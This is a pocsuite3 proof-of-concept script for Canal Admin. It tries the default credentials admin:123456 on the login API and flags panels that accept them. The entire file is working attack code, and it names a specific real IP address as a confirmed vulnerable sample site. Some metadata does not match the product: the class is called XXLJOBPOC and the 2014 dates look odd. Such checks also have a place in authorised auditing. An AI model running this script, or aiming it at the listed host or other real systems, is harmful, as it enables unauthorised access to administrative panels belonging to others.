from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)


class XXLJOBPOC(POCBase):
    vulID = "1571"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "mhx"  # PoC作者的大名
    vulDate = "2014-10-16"  # 漏洞公开的时间,不知道就写今天
    createDate = "2014-10-16"  # 编写 PoC 的日期
    updateDate = "2014-10-16"  # PoC 更新的时间,默认和编写时间一样
    references = ["https://github.com/alibaba/canal"]  # 漏洞地址来源,0day不用写
    name = "Canal Admin存在默认口令漏洞 PoC"  # PoC 名称
    appPowerLink = "https://github.com/alibaba/canal/wiki"  # 漏洞厂商主页地址
    appName = "Canal Admin"  # 漏洞应用名称
    appVersion = "all"  # 漏洞影响版本
    vulType = VUL_TYPE.WEAK_PASSWORD  # 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = ["http://42.51.74.8:8089/"]  # 测试样列,就是用 PoC 测试成功的网站
    # install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """
               Canal Admin后台存在默认口令,攻击者可以直接通过默认口令登录后台进行敏感操作
           """  # 漏洞简要描述
    pocDesc = """
               admin:123456
           """  # POC用法描述

    def _check(self):
        # 漏洞验证代码

        url = f"{self.url}/api/v1/user/login"
        headers = {"Accept": "application/json, text/plain, */*",
                   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
                   "Content-Type": "application/json;charset=UTF-8", "Origin": "http://42.51.74.8:8089",
                   "Referer": "http://42.51.74.8:8089/", "Accept-Encoding": "gzip, deflate",
                   "Accept-Language": "zh-CN,zh;q=0.9,ja;q=0.8", "Connection": "close"}
        json = {"password": "123456", "username": "admin"}
        result = []
        try:
            res = requests.post(url=url, headers=headers, allow_redirects=False, json=json, verify=False, timeout=5)
            data_dict = res.json()
            # 判断是否存在漏洞
            if data_dict.get("code") == 20000 and data_dict.get("message") == None:
                result.append(url)
        except Exception as e:
            pass
        finally:
            return result

    def _verify(self):
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.pocDesc
        return self.parse_verify(result)

    def _attack(self):
        return self._verify()

    def parse_verify(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output


def other_fuc():
    pass


def other_utils_func():
    pass


# 注册 DemoPOC 类
register_poc(XXLJOBPOC)
